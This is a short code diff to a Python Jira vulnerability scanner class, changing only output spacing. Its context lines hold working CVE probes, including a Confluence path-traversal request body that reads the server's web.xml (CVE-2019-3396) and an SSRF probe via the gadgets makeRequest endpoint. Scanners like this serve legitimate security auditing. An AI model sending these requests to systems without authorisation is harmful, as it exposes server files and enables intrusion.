@@ -118,14 +118,14 @@ class ActiveJira:
         poc = target + '/secure/ContactAdministrators!default.jspa'
         response = requests.get(poc)
         if b'has not yet configured this contact form' not in response.content and b'Contact Site Administrators' in response.content:
-            print("CVE-2019-11581" + Fore.RED + "\t\t" + "CRITICAL" + Style.RESET_ALL + "\t\t" + f"{poc}")
+            print("CVE-2019-11581" + Fore.RED + "\t\t" + "CRITICAL" + Style.RESET_ALL + "\t" + f"{poc}")
     
     def cve_2019_3396(self, target):
         poc = target + '/rest/tinymce/1/macro/preview'
         response = requests.post(poc, data='{"contentId":"1","macro":{"name":"widget","body":"","params":{"url":"https://www.google.com","width":"1000","height":"1000","_template":"../web.xml"}}}')
         
         if b'<param-name>contextConfigLocation</param-name>' in response.content and response.status_code == 200:
-            print("CVE-2019-3396" + Fore.RED + "\t\t" + "CRITICAL" + Style.RESET_ALL + "\t\t" + f"{poc}")
+            print("CVE-2019-3396" + Fore.RED + "\t\t" + "CRITICAL" + Style.RESET_ALL + "\t" + f"{poc}")
     
     def cve_2019_8451(self, target):
         poc = target + '/plugins/servlet/gadgets/makeRequest?url=https://google.com'
@@ -149,7 +149,7 @@ class ActiveJira:
         response = requests.get(poc)
         
         if b'general configuration for the Insight plugin.' in response.content and response.status_code == 200:
-            print("CVE-2022-0540" + Fore.RED + "\t\t" + "CRITICAL" + Style.RESET_ALL + "\t\t" + f"{poc}")
+            print("CVE-2022-0540" + Fore.RED + "\t\t" + "CRITICAL" + Style.RESET_ALL + "\t" + f"{poc}")
     
     def cve_2022_39960(self, target):
         poc = target + '/plugins/servlet/groupexportforjira/admin/json'
